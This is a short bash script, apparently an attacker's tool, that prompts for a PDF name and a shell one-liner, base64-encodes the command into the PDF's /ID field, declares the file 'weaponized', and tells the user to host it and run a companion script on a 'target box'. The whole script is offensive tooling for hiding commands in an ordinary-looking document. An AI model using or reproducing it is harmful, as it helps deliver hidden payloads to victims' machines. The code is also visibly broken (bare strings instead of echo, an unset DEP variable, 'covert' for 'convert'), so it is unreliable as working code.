#!/bin/bash

if [[ ! -f /usr/bin/convert ]];
then
	"[-] Dependency Missing: convert"
	DEP=0
elif [[ ! -f /usr/bin/base64 ]];
then
	"[-] Dependency Missing: base64"
	DEP=0
elif [[ ! -f /usr/bin/wget ]];
then
	"[-] Dependency Missing: wget"
	DEP=0
fi

if [ $DEP -eq 0 ];
then
	exit
fi


echo "[+] Input File Name (e.g. mal.pdf)"
read fname

echo "[+] Input Shell Commands (i.e. one liner)"
read shell

payload=$(echo $shell | base64)

covert xc:none -page Letter $fname && 
sed -i "s/^\/ID \[<.*><.*>\]/\/ID \[<$payload> <$payload>\]/g" $fname &&
echo "[+] $fname PDF weaponized"
echo "[+] Host it on a webserver and run pdfpwn.sh on target box"
